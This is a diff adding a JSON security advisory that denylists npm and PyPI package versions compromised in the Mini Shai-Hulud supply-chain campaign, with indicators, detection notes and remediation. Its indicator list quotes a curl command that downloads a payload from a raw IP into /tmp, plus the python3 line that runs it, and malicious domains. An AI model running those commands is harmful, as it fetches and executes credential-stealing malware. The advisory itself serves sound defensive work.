@@ -1,0 +1,93 @@
+{
+  "advisory_id": "SECOPSAI-ADV-2026-05-MINI-SHAI-HULUD",
+  "campaign_id": "mini-shai-hulud",
+  "title": "Mini Shai-Hulud npm and PyPI supply-chain campaign",
+  "summary": "Emergency denylist for confirmed Mini Shai-Hulud compromised package versions, including removed or yanked npm/PyPI artifacts that may no longer be fetchable for artifact diffing.",
+  "severity": "critical",
+  "confidence": "high",
+  "status": "active",
+  "published_at": "2026-05-11T00:00:00Z",
+  "updated_at": "2026-05-12T00:00:00Z",
+  "ingested_at": "2026-05-12T00:00:00Z",
+  "source_names": [
+    "OX Security",
+    "Socket",
+    "SecOpsAI local supply-chain findings"
+  ],
+  "source_urls": [
+    "https://www.ox.security/blog/shai-hulud-here-we-go-again-170-packages-hit-across-npm-pypi/",
+    "https://socket.dev/blog/tanstack-npm-packages-compromised-mini-shai-hulud-supply-chain-attack"
+  ],
+  "affected": [
+    {
+      "ecosystem": "npm",
+      "package": "@opensearch-project/opensearch",
+      "versions": ["3.5.3", "3.6.2", "3.7.0", "3.8.0"],
+      "safe_versions": ["Use a non-listed version after verifying upstream maintainer guidance and lockfile integrity."]
+    },
+    {
+      "ecosystem": "pypi",
+      "package": "mistralai",
+      "versions": ["2.4.6"],
+      "safe_versions": ["Use a non-listed version after verifying upstream maintainer guidance and lockfile integrity."]
+    },
+    {
+      "ecosystem": "pypi",
+      "package": "guardrails-ai",
+      "versions": ["0.10.1"],
+      "safe_versions": ["Use a non-listed version after verifying upstream maintainer guidance and lockfile integrity."]
+    },
+    {"ecosystem": "npm", "package": "@squawk/airport-data", "versions": ["0.7.8"]},
+    {"ecosystem": "npm", "package": "@squawk/airport-data-india", "versions": ["0.1.12"]},
+    {"ecosystem": "npm", "package": "@squawk/airport-data-north-america", "versions": ["0.5.8"]},
+    {"ecosystem": "npm", "package": "@squawk/airport-data-oceania", "versions": ["0.3.8"]},
+    {"ecosystem": "npm", "package": "@squawk/airport-data-south-america", "versions": ["0.3.8"]},
+    {"ecosystem": "npm", "package": "@squawk/mcp", "versions": ["0.9.5"]},
+    {"ecosystem": "npm", "package": "@squawk/safe-distance-calc", "versions": ["1.1.8"]},
+    {"ecosystem": "npm", "package": "@squawk/scenery-pack", "versions": ["1.0.6"]},
+    {"ecosystem": "npm", "package": "@squawk/sector-data", "versions": ["0.1.6"]},
+    {"ecosystem": "npm", "package": "@squawk/sector-data-africa", "versions": ["0.1.5"]},
+    {"ecosystem": "npm", "package": "@squawk/sector-data-asia", "versions": ["0.1.4"]},
+    {"ecosystem": "npm", "package": "@squawk/sector-data-atlantic-pacific-oceanic", "versions": ["0.1.4"]},
+    {"ecosystem": "npm", "package": "@squawk/sector-data-europe", "versions": ["0.1.4"]},
+    {"ecosystem": "npm", "package": "@squawk/sector-data-north-america", "versions": ["0.1.5"]},
+    {"ecosystem": "npm", "package": "@squawk/sector-data-south-america", "versions": ["0.1.5"]},
+    {"ecosystem": "npm", "package": "@squawk/simbrief", "versions": ["1.1.3"]},
+    {"ecosystem": "npm", "package": "@squawk/terminal-data", "versions": ["0.1.8"]},
+    {"ecosystem": "npm", "package": "@squawk/terminal-data-africa", "versions": ["0.1.6"]},
+    {"ecosystem": "npm", "package": "@squawk/terminal-data-asia", "versions": ["0.1.6"]},
+    {"ecosystem": "npm", "package": "@squawk/terminal-data-europe", "versions": ["0.1.6"]},
+    {"ecosystem": "npm", "package": "@squawk/terminal-data-north-america", "versions": ["0.1.7"]},
+    {"ecosystem": "npm", "package": "@squawk/terminal-data-oceania", "versions": ["0.1.6"]},
+    {"ecosystem": "npm", "package": "@squawk/terminal-data-south-america", "versions": ["0.1.6"]},
+    {"ecosystem": "npm", "package": "@squawk/weather-metar", "versions": ["0.2.7"]}
+  ],
+  "iocs": {
+    "domains": ["git-tanstack.com", "googleapis.cloud"],
+    "urls": [
+      "https://git-tanstack.com/transformers.pyz",
+      "https://83.142.209.194/transformers.pyz",
+      "https://googleapis.cloud/cdn/router_init.js"
+    ],
+    "ips": ["83.142.209.194"],
+    "file_paths": ["/tmp/transformers.pyz"],
+    "filenames": ["transformers.pyz", "router_init.js", "setup.mjs"],
+    "commands": [
+      "python3 /tmp/transformers.pyz",
+      "curl -k -L -s https://83.142.209.194/transformers.pyz -o /tmp/transformers.pyz",
+      "npm preinstall/prepare lifecycle execution"
+    ],
+    "campaign_labels": ["TeamPCP", "Mini Shai-Hulud", "Shai-Hulud"]
+  },
+  "detection_rationale": [
+    "Confirmed compromised package versions may have been removed from registries, preventing artifact fetch or diff generation.",
+    "PyPI samples used import-time Python execution to download transformers.pyz into /tmp and execute it with python3.",
+    "npm samples used lifecycle hooks and staged JavaScript such as setup.mjs and router_init.js to harvest credentials and target GitHub Actions/OIDC material."
+  ],
+  "remediation": [
+    "Block the listed package versions in package managers, CI allowlists, lockfile policy, and artifact proxies.",
+    "Rotate credentials exposed to affected build hosts, developer workstations, package manager tokens, GitHub tokens, and OIDC-trusted cloud roles.",
+    "Search for network access to listed domains, URLs, and IP addresses, and for /tmp/transformers.pyz on Linux hosts.",
+    "Rebuild from clean lockfiles and known-good package versions after cache purge."
+  ]
+}
